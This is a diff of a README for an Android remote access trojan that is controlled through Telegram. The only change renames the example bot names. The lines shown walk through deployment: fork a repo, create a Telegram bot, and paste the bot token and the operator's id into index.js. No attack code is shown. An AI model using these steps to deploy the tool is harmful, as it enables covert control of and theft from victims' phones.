@@ -17,8 +17,8 @@ A telegram based android RAT
 - <a href="https://replit.com......">Fork Repo</a>
 - Open your telegram then search <a href="https://t.me/BotFather"> @BotFather</a>
 - Type ```/newbot```
-- Then send your bot name. For example : SH-Hacked_Bot 
-- Send your bot username. For example sh_hacked_bot
+- Then send your bot name. For example : OPTIX-RAT
+- Send your bot username. For example Optix_Rat_bot
 - Copy the botToken and paste it on index.js token value
 - The search <a href="https://t.me/cybersh_bot">@cybersh_bot</a> then type ````/id````
 - Copy your id and edit the index.js id value.
